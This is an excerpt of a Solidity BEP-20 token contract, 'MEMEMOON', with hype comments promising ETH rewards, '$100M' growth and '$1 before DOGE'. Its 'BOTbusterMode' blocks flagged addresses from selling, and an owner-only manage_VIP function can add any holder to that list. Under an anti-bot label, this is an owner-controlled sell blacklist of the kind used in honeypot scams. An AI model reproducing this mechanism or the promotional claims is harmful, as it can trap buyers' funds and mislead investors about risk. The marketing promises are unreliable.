...
The first token on the BSC smartchain to combine the rebase rewards with rewards and a dog! 
Hold $MEMEMOON and receive $ETH directly to your BEP-20 wallet as a reward for holding 

TG: https://t.me/MEMEMOON_TOKEN

We are a MEME coin that will have 5 important factors to healthy growth to $100M
1. Marketing (This is going to be the craziest marketing you ever seen)
2. Global (We are building a global community hiring companies to manage communities)
3. Reward system (By holding MEMEMOON you will be receiving tokens!)
4. No dev allocations, No presale, No private sale, No whitelist
5. NFT's part of the Q4 roadmap to be released on the ERC network
*/
...
contract MEMEMOON is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "MEMEMOON";
    string constant _symbol = "MEMEMOON";
    ...
    bool public BOTbusterMode = false;
    ...
    event BusterCheckin(address guest, uint256 rentPaid);
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x7a0e59CfCeeAEBd3524AEb5CC66fc7FaE4f11FA3;
    ...
    // plz ser, dont snipe with a bot
        if(BOTbusterMode){
            require(!isVIP[sender],"Bots cant sell");
            if(tx.gasprice > maxRoomRent && sender == pair){
                isVIP[recipient] = true;
                emit BusterCheckin(recipient, tx.gasprice);
            }
        }
    ...
    // lobby manager
    function enable_BOT_BusterMode(bool _status) public onlyOwner {
        BOTbusterMode = _status;
    }
    ...
    function manage_VIP(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isVIP[addresses[i]] = status;
        }
    }
...
// ~Target is $1 before DOGE. Witness the happening!